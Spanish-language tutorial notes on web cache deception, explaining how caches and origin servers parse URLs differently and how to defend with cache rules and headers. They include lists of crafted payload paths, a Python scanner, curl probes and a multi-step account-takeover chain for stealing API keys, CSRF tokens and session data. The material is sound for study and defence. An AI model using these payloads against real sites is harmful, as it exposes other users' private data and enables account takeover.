---
icon: folder-open
---

# Web cache deception

## 🧠 ¿Qué es Web Cache Deception?

Web Cache Deception es una vulnerabilidad en la que un atacante engaña a un sistema de caché (CDN, proxy inverso o caché web) para que almacene contenido sensible y específico de un usuario, explotando diferencias en cómo la caché y el servidor de origen interpretan las URLs. El ataque funciona porque:

* **Decisión de la caché**: Basada en la ruta de la URL, la caché cree que es un recurso estático (por ejemplo, .js, .css) y cachea la respuesta
* **Decisión del servidor de origen**: El servidor de origen ignora el componente manipulado de la ruta y devuelve la página sensible real
* **Resultado**: Los datos privados del usuario se cachean y pasan a ser accesibles para el atacante

#### 🎯 Diferencia clave respecto a Cache Poisoning:

* **Cache Poisoning**: El atacante envenena la caché con contenido malicioso que las víctimas reciben
* **Cache Deception**: El atacante engaña a la caché para almacenar datos privados de la víctima que luego puede consultar

***

### ⚙️ Cómo funciona Web Cache Deception

#### 🧩 Flujo básico del ataque:

1. El atacante identifica un endpoint sensible: `/my-account`
2. El atacante crea una URL: `/my-account/nonexistent.js`
3. La caché ve la extensión `.js` y decide cachear
4. El servidor de origen devuelve `/my-account` (ignora `/nonexistent.js`)
5. La víctima visita la URL manipulada
6. La respuesta se cachea con los datos privados de la víctima
7. El atacante accede a la misma URL y lee los datos cacheados

#### ⚠️ La discrepancia:

* Interpretación de la caché: `/my-account/nonexistent.js` → archivo estático cacheable
* Interpretación del servidor: `/my-account/nonexistent.js` → `/my-account` (página dinámica)
* Resultado: La página dinámica privada se cachea como si fuera un archivo estático

***

### 🔀 Diferencias en el procesamiento de rutas

#### 📂 Path mapping

```
/my-account           → No cachear (dinámico)
/my-account/file.js   → Cachear (JavaScript estático)
```

```
/my-account           → Sirve el panel del usuario
/my-account/file.js   → Sigue sirviendo el panel del usuario (file.js no existe)
```

#### 🔗 Delimitadores de ruta:

```
/my-account;file.js
/my-account?file.js
/my-account#file.js
/my-account%23file.js
/my-account%3Ffile.js
```

* La caché puede usar `;` o `?` como delimitadores y eliminar lo que sigue
* El servidor puede tratar toda la cadena como ruta

#### 🧭 Path Traversal:

```
/resources/../my-account → /my-account (no cachear)
```

```
/resources/..%2fmy-account → La caché no normaliza, ve /resources/* (cacheable)
                            → El servidor normaliza a /my-account (sirve la cuenta)
```

#### 🔄 Diferencias de normalización

➡️ **Normalización del servidor de origen:**

```
URL: /my-account%2f..%2fresources
Origin ve: /resources (tras normalización)
Cache ve: /my-account%2f..%2fresources (cacheable si /resources/* se cachea)
```

➡️ **Normalización de la caché:**

```
URL: /my-account%23%2f..%2fresources
Cache ve: /my-account → /resources (normalizado, cacheable)
Origin ve: /my-account%23%2f..%2fresources → /my-account
```

***

### 📦 Reglas comunes de caché

#### 📄 Cacheo por extensión:

✅ **Cacheados:**

* .js, .css, .jpg, .png, .gif, .svg, .woff, .ttf
* .pdf, .zip, .tar, .gz

❌ **No cacheados:**

* .html, .php, .asp, .jsp
* (sin extensión)

#### 📁 Cacheo por directorio:

✅ **Cacheados:**

* /static/\*
* /assets/\*
* /resources/\*
* /public/\*

❌ **No cacheados:**

* /user/\*
* /account/\*
* /admin/\*

#### 🎯 Reglas de coincidencia exacta:

* /robots.txt
* /sitemap.xml
* /favicon.ico
* /.well-known/\*

***

### 💣 Técnicas de explotación

#### 🧩 Path Mapping:

```
/my-account/fake.js
```

Pasos:

1. Identificar endpoint sensible
2. Añadir nombre de archivo falso
3. Comprobar si se cachea
4. Enviar a la víctima
5. Acceder a la versión cacheada

#### 🔗 Delimitadores:

```
/my-account;fake.js
/my-account?fake.js
/my-account#fake.js
/my-account%3Bfake.js
/my-account%3Ffake.js
/my-account%23fake.js
```

#### 📁 Path Traversal:

```
/resources/../my-account
/resources/..%2fmy-account
/resources/..%2fmy-account?key=123
```

#### 🔄 Normalización:

```
/my-account%2f..%2fresources/file.css
/my-account%23%2f..%2fresources
```

#### 🎯 Coincidencia exacta:

```
/my-account;%2f..%2frobots.txt
/my-account/../robots.txt
```

* La caché ve `/robots.txt` (cacheable)
* El servidor sirve `/my-account`

***

### 🎯 Vectores de ataque

#### 🔑 Robo de API key:

* Target: `/my-account`
* Ataque: `/my-account/x.js` o `/my-account;x.js`
* Resultado: API key cacheada

#### 🔐 Robo de CSRF:

* Target: `/profile`
* Ataque: `/profile?cache.js`
* Resultado: token robado

#### 👤 Información personal:

* Target: `/dashboard`
* Ataque: `/dashboard/static.css`

#### 🎟️ Tokens de sesión:

* Target: `/settings`
* Ataque: `/settings;key.js`

***

### 🔍 Métodos de detección

#### 🧑‍💻 Manual

**➡️ Paso 1: Identificar endpoints sensibles**

* /my-account
* /profile
* /settings
* /dashboard
* /api/user

➡️ **Paso 2: Probar append**

* /my-account/test.js
* /my-account/test.css
* /my-account/test.jpg

**➡️ Paso 3: Verificar caché**

Headers:

* X-Cache: HIT
* X-Cache-Status: HIT
* Age: 120
* Cache-Control: public, max-age=3600

**➡️ Paso 4: Probar delimitadores**

* /my-account;test.js
* /my-account?test.js
* /my-account#test.js
* /my-account%3Btest.js

**➡️ Paso 5: Path traversal**

* /resources/../my-account
* /resources/..%2fmy-account
* /static/../my-account?file.js

#### 🤖 Automatizado

```python
import requests

def test_cache_deception(url, endpoint):
    payloads = [
        f"{endpoint}/fake.js",
        f"{endpoint};fake.js",
        f"{endpoint}?fake.js",
        f"/resources/..%2f{endpoint}",
    ]
    
    for payload in payloads:
        resp = requests.get(f"{url}{payload}")
        
        if 'X-Cache' in resp.headers:
            if 'HIT' in resp.headers['X-Cache']:
                print(f"[+] Cached: {payload}")
                
                if 'api-key' in resp.text.lower():
                    print(f"[!] Sensitive data exposed!")
```

***

### 💥 Impacto real

* PayPal (2018): exposición de cuentas
* CloudFlare: filtración de datos
* CDNs mal configurados
* E-commerce: historial, datos, tokens

***

### 🛡️ Defensa

#### 🔒 Reglas estrictas:

```nginx
location ~* \.(js|css|png|jpg|jpeg|gif|ico|svg|woff|woff2|ttf)$ {
    add_header Cache-Control "public, max-age=31536000";
}
```

```
location /my-account {
    add_header Cache-Control "no-store, no-cache, must-revalidate";
}
```

#### 🧪 Validación de URL:

```javascript
if (path.includes('..')) return 400;
```

#### 📡 Headers:

```http
Cache-Control: no-store, no-cache, must-revalidate, private
Pragma: no-cache
Expires: 0
```

```http
Vary: Cookie, Authorization
```

#### 🔄 Normalización:

```python
normalized = os.path.normpath(decoded)
```

#### 🔑 Cache key:

```
cache_key = url + cookie + authorization_header
```

#### 🧱 Defensa en profundidad:

1. No cachear contenido autenticado
2. Headers correctos
3. Validar URLs
4. Monitorizar caché
5. Testear regularmente

***

### 🧪 Metodología de testeo

#### 🔍 Discovery:

1. Identificar CDN
2. Mapear endpoints
3. Entender reglas
4. Testear parsing

#### 💣 Explotación:

1. Elegir endpoint
2. Añadir extensión
3. Probar delimitadores
4. Probar traversal
5. Verificar caché
6. Simular víctima
7. Confirmar acceso

#### 🔁 Automatización:

```bash
curl -I "https://target.com${endpoint}/fake${ext}"
```

```bash
curl -I "https://target.com/my-account${delim}fake.js"
```

#### ✅ Verificación:

1. Enviar request
2. Esperar cache
3. Repetir request
4. Ver Age
5. Ver X-Cache: HIT

***

### 🚀 Técnicas avanzadas

#### 🧬 Manipulación de cache key:

```
/my-account/victim1.js
/my-account/victim2.js
/my-account/1638360000.js
```

#### 🔁 Ataques multi-step:

1. Robar CSRF
2. Cambiar email
3. Reset password
4. Takeover

#### 💥 Encadenamiento con XSS:

```html
<script src="/my-account;evil.js"></script>
```

***

### 🛠️ Herramientas y recursos

#### 💣 Herramientas:

* Burp Suite
* Param Miner
* curl
* Web Cache Scanner

#### 📡 Headers importantes:

* X-Cache
* X-Cache-Status
* Age
* Cache-Control
* Vary
* CF-Cache-Status
* X-Akamai-Cache-Status

#### 📚 Wordlists útiles:

* Delimitadores: ; ? # %3B %3F %23
* Extensiones: .js .css .jpg .png .gif
* Paths: /static /assets /resources /public
